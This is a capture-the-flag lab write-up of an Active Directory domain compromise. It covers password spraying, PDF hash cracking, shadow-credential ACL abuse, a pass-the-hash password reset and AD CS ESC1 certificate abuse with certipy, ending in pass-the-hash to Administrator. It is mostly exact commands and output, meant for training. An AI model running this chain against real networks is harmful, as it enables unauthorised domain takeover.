## Description
```Description
## Objective / Scope

You are a member of the Hack Smarter Red Team. During a phishing engagement, you were able to retrieve credentials for the client's Active Directory environment. Use these credentials to enumerate the environment, elevate your privileges, and demonstrate impact for the client.

#### [](https://www.hacksmarter.org/events/7f9dc321-77ce-49b8-8acc-5c224ef25d8d/take/welcome-easy#user-content-starting-credentials)Starting Credentials
```
##### Credentials
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```
e.hills:[password omitted]
```
-----
##### IP
```IP
10.1.24.45
```
----
##### Enumeration
- Rust-Scan
```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-08-06 22:46:59Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: WELCOME.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-06T22:48:47+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.WELCOME.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.WELCOME.local
| Issuer: commonName=WELCOME-CA/domainComponent=WELCOME
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-06T22:31:15
| Not valid after:  2027-08-06T22:31:15
| MD5:     383b 87c0 1fcc d7aa b02f ccdd 8136 dca1
| SHA-1:   58b0 45c7 e36f f8cc dd6f 3b14 c097 8571 7c3d 884a
| SHA-256: 9113 d4ac 73d3 69c0 f3d8 cf55 2555 e438 0ae9 dd22 f909 6f1f 09c6 e795 886f e0ca
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: WELCOME.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.WELCOME.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.WELCOME.local
| Issuer: commonName=WELCOME-CA/domainComponent=WELCOME
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-06T22:31:15
| Not valid after:  2027-08-06T22:31:15
| MD5:     383b 87c0 1fcc d7aa b02f ccdd 8136 dca1
| SHA-1:   58b0 45c7 e36f f8cc dd6f 3b14 c097 8571 7c3d 884a
| SHA-256: 9113 d4ac 73d3 69c0 f3d8 cf55 2555 e438 0ae9 dd22 f909 6f1f 09c6 e795 886f e0ca
|_ssl-date: 2026-08-06T22:48:47+00:00; 0s from scanner time.
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: WELCOME.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.WELCOME.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.WELCOME.local
| Issuer: commonName=WELCOME-CA/domainComponent=WELCOME
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-06T22:31:15
| Not valid after:  2027-08-06T22:31:15
| MD5:     383b 87c0 1fcc d7aa b02f ccdd 8136 dca1
| SHA-1:   58b0 45c7 e36f f8cc dd6f 3b14 c097 8571 7c3d 884a
| SHA-256: 9113 d4ac 73d3 69c0 f3d8 cf55 2555 e438 0ae9 dd22 f909 6f1f 09c6 e795 886f e0ca
|_ssl-date: 2026-08-06T22:48:47+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: WELCOME.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.WELCOME.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.WELCOME.local
| Issuer: commonName=WELCOME-CA/domainComponent=WELCOME
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-06T22:31:15
| Not valid after:  2027-08-06T22:31:15
| MD5:     383b 87c0 1fcc d7aa b02f ccdd 8136 dca1
| SHA-1:   58b0 45c7 e36f f8cc dd6f 3b14 c097 8571 7c3d 884a
| SHA-256: 9113 d4ac 73d3 69c0 f3d8 cf55 2555 e438 0ae9 dd22 f909 6f1f 09c6 e795 886f e0ca
|_ssl-date: 2026-08-06T22:48:47+00:00; 0s from scanner time.
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: WELCOME
|   NetBIOS_Domain_Name: WELCOME
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: WELCOME.local
|   DNS_Computer_Name: DC01.WELCOME.local
|   DNS_Tree_Name: WELCOME.local
|   Product_Version: 10.0.20348
|_  System_Time: 2026-08-06T22:48:08+00:00
| ssl-cert: Subject: commonName=DC01.WELCOME.local
| Issuer: commonName=DC01.WELCOME.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-05T22:40:13
| Not valid after:  2027-02-04T22:40:13
| MD5:     1673 b587 5312 6c89 52a3 a7fd dbba d36e
| SHA-1:   f37e bb27 acea 6340 7d31 dd6d f6eb 040e d287 2922
| SHA-256: bc78 c8a8 b42a 625e 481a be0a 2b79 0c55 57db 82e4 f154 96c2 21a0 813e d8f1 b97c
|_ssl-date: 2026-08-06T22:48:47+00:00; 0s from scanner time.
5357/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49735/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49751/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49907/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
```
----
##### SystemInfo
```txt
| rdp-ntlm-info:
|   Target_Name: WELCOME
|   NetBIOS_Domain_Name: WELCOME
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: WELCOME.local
|   DNS_Computer_Name: DC01.WELCOME.local
|   DNS_Tree_Name: WELCOME.local
|   Product_Version: 10.0.20348
|_  System_Time: 2026-08-06T22:48:08+00:00
```
-----
##### SMB
- SMB Shares
```bash
$ nxc smb $TARGET -u '' -p ''
SMB         10.1.24.45      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.24.45      445    DC01             [+] WELCOME.local\:

$ nxc smb $TARGET -u 'e.hills' -p '[password omitted]'
SMB         10.1.24.45      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.24.45      445    DC01             [+] WELCOME.local\e.hills:[password omitted]

$ smbmap -H $TARGET -u $USER -p $PASS
[+] IP: 10.1.24.45:445	Name: 10.1.24.45          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Human Resources                                   	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	SYSVOL                                            	READ ONLY	Logon server share
[*] Closed 1 connections
```
- Share - `Human Resources` enumeration
```bash
$ smbclient //10.1.24.45/"Human Resources" -U 'WELCOME\e.hills'
Try "help" to get a list of possible commands.
smb: \> ls
  .      D        0  Sat Sep 13 19:20:17 2025
  ..     D        0  Sat Sep 13 16:11:19 2025
  Welcome 2025 Holiday Schedule.pdf      
  Welcome Benefits.pdf              
  Welcome Handbook Excerpts.pdf      
  Welcome Performance Review Guide.pdf 
  Welcome Start Guide.pdf        
  
recurse ON 
prompt OFF 
mget *
```
- Inside own Linux Machine
```bash
$ pdfgrep -Ri "password" . 
$ pdfgrep -Ri "username" . 
$ pdfgrep -Ri "admin" . 
$ pdfgrep -Ri "credential" . 
$ pdfgrep -Ri "vpn" .
pdfgrep: Could not open ./Welcome Start Guide.pdf
```
- `Welcome Start Guide.pdf` is protected by `Password`
```bash
$ pdf2john Welcome\ Start\ Guide.pdf > pdf.hash

$ john pdf.hash --wordlist=/usr/share/wordlists/rockyou.txt
[password omitted]   (Welcome Start Guide.pdf)
```
- `Welcome Start Guide.pdf` File Content
```bash
Temporary/default password: [password omitted]
On first login, you MUST change this password immediately.
```
- `Initial/Temporary` Password - `[password omitted]`
----
##### NXC
- Enumerating more about the Machine - `Users`
```bash
nxc ldap 10.1.24.45 \
-u e.hills \
-p '[password omitted]' \
--users | tee users_output.txt

- extract only users 

$ awk '/LDAP/ && $5 !~ /^\[/ && $5 != "-Username-" {print $5}' users_output.txt > users.txt
```
- Users List
```bash
$ cat users.txt
Administrator
Guest
krbtgt
e.hills
j.crickets
e.blanch
i.park
j.johnson
a.harris
svc_ca
svc_web
```
- Already have temporary / Initial Password - `[password omitted]`
- Check if any users didn't change there Default Password
```bash
$ nxc smb 10.1.24.45 -u users.txt -p '[password omitted]'
SMB         10.1.24.45      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.24.45      445    DC01             [-] WELCOME.local\Administrator:[password omitted] STATUS_LOGON_FAILURE
SMB         10.1.24.45      445    DC01             [-] WELCOME.local\Guest:[password omitted] STATUS_LOGON_FAILURE
SMB         10.1.24.45      445    DC01             [-] WELCOME.local\krbtgt:[password omitted] STATUS_LOGON_FAILURE
SMB         10.1.24.45      445    DC01             [-] WELCOME.local\e.hills:[password omitted] STATUS_LOGON_FAILURE
SMB         10.1.24.45      445    DC01             [-] WELCOME.local\j.crickets:[password omitted] STATUS_LOGON_FAILURE
SMB         10.1.24.45      445    DC01             [-] WELCOME.local\e.blanch:[password omitted] STATUS_LOGON_FAILURE
SMB         10.1.24.45      445    DC01             [-] WELCOME.local\i.park:[password omitted] STATUS_LOGON_FAILURE
SMB         10.1.24.45      445    DC01             [-] WELCOME.local\j.johnson:[password omitted] STATUS_LOGON_FAILURE
SMB         10.1.24.45      445    DC01             [+] WELCOME.local\a.harris:[password omitted]
```
- User - `a.harris` have the default Password `[password omitted]`
```bash
$ nxc winrm $TARGET -u "$USER" -p "$PASS"
WINRM       10.1.24.45      5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:WELCOME.local)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.1.24.45      5985   DC01             [+] WELCOME.local\a.harris:[password omitted] (Pwn3d!)
```
- Its `Pwn3d!` 
----
##### EVIL-WINRM
```bash
$ evil-winrm -i $TARGET -u $USER -p $PASS
*Evil-WinRM* PS C:\Users\a.harris\Documents> dir
*Evil-WinRM* PS C:\Users\a.harris\Documents> cd ..
dir
*Evil-WinRM* PS C:\Users\a.harris> dir

    Directory: C:\Users\a.harris

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         9/13/2025   8:48 PM                Desktop
d-r---         9/13/2025   8:45 PM                Documents
d-r---          5/8/2021   1:20 AM                Downloads
d-r---          5/8/2021   1:20 AM                Favorites
d-r---          5/8/2021   1:20 AM                Links
d-r---          5/8/2021   1:20 AM                Music
d-r---          5/8/2021   1:20 AM                Pictures
d-----          5/8/2021   1:20 AM                Saved Games
d-r---          5/8/2021   1:20 AM                Videos

*Evil-WinRM* PS C:\Users\a.harris> cd Desktop
*Evil-WinRM* PS C:\Users\a.harris\Desktop> dir

    Directory: C:\Users\a.harris\Desktop
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/13/2025   8:48 PM             32 user.txt
*Evil-WinRM* PS C:\Users\a.harris\Desktop> type user.txt
[flag omitted]
*Evil-WinRM* PS C:\Users\a.harris\Desktop>
```
- User Flag - `[flag omitted]`
---- 
##### BloodHound
- User - `a.harris` & Pass - `[password omitted]`
```bash
a.harris -Member_of -> HR@WELCOME.local -Generic_All -> I.park
i.park (IT Intern) -- 
```
- Using `Bloodyad` I change the Password for the user `i.park` ``
```bash
$ bloodyad \ 
--host DC01.WELCOME.local \ 
-d WELCOME.local \ 
-u i.park \ 
-k \ 
get writable 

distinguishedName: CN=S-1-5-
11,CN=ForeignSecurityPrincipals,DC=WELCOME,DC=local 
permission: WRITE

distinguishedName: CN=Ian Park,CN=Users,DC=WELCOME,DC=local 
permission: WRITE 

distinguishedName: DC=WELCOME.local,CN=MicrosoftDNS,DC=DomainDnsZones,DC=WELCOME,DC=local 
permission: CREATE_CHILD 

distinguishedName: DC=_msdcs.WELCOME.local,CN=MicrosoftDNS,DC=ForestDnsZones,DC=WELCOME,DC=local permission: CREATE_CHILD

$ bloodyad \
  --host DC01.WELCOME.local \
  -d WELCOME.local \
  -u a.harris \
  -p '[password omitted]' \
  add shadowCredentials i.park
[+] KeyCredential generated with following sha256 of RSA key: fd332a049f44def8c34b1dbef4edd15a094ff709ea95ac8879201820c0835f89
[+] TGT stored in ccache file i.park_5T.ccache

NT: [nthash omitted]
```
- Shadow Creds Generated
```bash
pth-net rpc password svc_ca 'P@ssw0rd!Welcome2026#' \
-U WELCOME/i.park%ffffffffffffffffffffffffffffffff:[nthash omitted] \
-S DC01.WELCOME.local
E_md4hash wrapper called. 
HASH PASS: Substituting user supplied NTLM HASH...
```
- Verify Creds actually Substitute 
```bash
nxc smb 10.1.24.45 \
-u svc_ca \
-p 'P@ssw0rd!Welcome2026#'
[+] WELCOME.local\svc_ca:P@ssw0rd!Welcome2026#
```
- It Works
- Progressed
```bash
e.hills
    ↓
a.harris (default password)
    ↓
GenericAll → Shadow Credentials
    ↓
i.park
    ↓
ForceChangePassword
    ↓
svc_ca ✅
```
- Enumerate AD CS
```bash
certipy-ad find \
-u svc_ca@WELCOME.local \
-p 'P@ssw0rd!Welcome2026#' \
-dc-ip 10.1.24.45 \
-enabled \
-vulnerable \
-stdout

Template: Welcome-Template

Enrollment Rights:
  WELCOME.LOCAL\svc_ca

Enrollee Supplies Subject : True
Client Authentication     : True

Vulnerabilities:
  ESC1
```
----
##### Certipy-ad
- Certificate 
```bash
$ certipy-ad req \
    -u svc_ca@WELCOME.local \
    -p 'P@ssw0rd!Welcome2026#' \
    -target DC01.WELCOME.local \
    -dc-ip 10.1.24.45 \
    -ca WELCOME-CA \
    -template Welcome-Template \
    -upn Administrator@WELCOME.local
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 22
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@WELCOME.local'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

```
- Administrator Hash
```bash
certipy-ad auth \
    -pfx administrator.pfx \
    -dc-ip 10.1.24.45
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@WELCOME.local'
[*] Using principal: 'administrator@welcome.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@welcome.local': aad3b435b51404eeaad3b435b51404ee:[nthash omitted]
```
- `Pass-The-Hash` 
---- 
##### Administrator
```bash
$ evil-winrm \
-i 10.1.24.45 \
-u Administrator \
-H [nthash omitted]

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
dir
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir

    Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/13/2025   5:47 PM             32 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
[flag omitted]
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```

# END